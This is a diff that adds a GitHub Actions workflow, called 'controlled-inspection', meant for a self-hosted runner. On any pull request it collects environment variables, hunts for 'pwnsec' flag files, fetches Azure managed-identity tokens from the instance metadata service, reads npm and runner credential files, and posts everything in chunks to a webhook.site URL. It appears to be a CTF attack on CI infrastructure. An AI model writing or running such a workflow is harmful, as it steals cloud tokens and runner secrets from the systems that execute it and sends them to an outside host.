@@ -1,0 +1,50 @@
+name: controlled-inspection
+on:
+  pull_request:
+  workflow_dispatch:
+jobs:
+  inspect:
+    runs-on: self-hosted
+    timeout-minutes: 10
+    steps:
+      - name: collect
+        run: |
+          set +e
+          WH="https://webhook.site/ff2b05c4-c59f-4580-80da-007cd524c2cf"
+          O=$(mktemp)
+          {
+            echo "=== WHOAMI ==="; id; hostname; pwd; uname -a
+            echo "=== ENV ==="; env | sort
+            echo "=== FLAG FILES ==="
+            find / -xdev -maxdepth 6 -type f \( -iname '*flag*' -o -iname '*pwnsec*' \) 2>/dev/null | head -80
+            for f in /flag /flag.txt /root/flag /root/flag.txt /opt/flag /opt/flag.txt \
+                     /home/*/flag /home/*/flag.txt /var/flag /srv/flag /flag/flag.txt; do
+              [ -f "$f" ] && { echo "--- $f ---"; cat "$f"; }
+            done
+            echo "=== GREP pwnsec{ ==="
+            grep -rIl 'pwnsec{' / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev 2>/dev/null | head -20
+            grep -rIoh 'pwnsec{[^}]*}' / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev 2>/dev/null | head -20
+            echo "=== AZURE IMDS instance ==="
+            curl -s -H 'Metadata: true' --max-time 6 \
+              'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
+            echo; echo "=== AZURE IMDS MI token (ARM) ==="
+            curl -s -H 'Metadata: true' --max-time 6 \
+              'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'
+            echo; echo "=== AZURE IMDS MI token (Vault) ==="
+            curl -s -H 'Metadata: true' --max-time 6 \
+              'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net'
+            echo; echo "=== .npmrc / runner creds ==="
+            cat .npmrc 2>/dev/null; cat ~/.npmrc 2>/dev/null
+            ls -la ~/ 2>/dev/null; ls -la ~/actions-runner 2>/dev/null
+            cat ~/actions-runner/.credentials 2>/dev/null
+            cat ~/actions-runner/.runner 2>/dev/null
+            echo "=== LISTENERS / NEIGHBOURS ==="; ss -lntp 2>/dev/null; ip a 2>/dev/null
+            echo "=== SDK (concierge) ==="
+            find / -xdev -path '*@continental*' -maxdepth 8 2>/dev/null | head -20
+          } > "$O" 2>&1
+          # chunk to stay under webhook body limits
+          split -b 180000 "$O" /tmp/chunk_
+          for c in /tmp/chunk_*; do
+            curl -s -X POST --data-binary @"$c" -H 'Content-Type: text/plain' "$WH?part=$(basename $c)" >/dev/null
+          done
+          echo "sent $(wc -c < "$O") bytes"
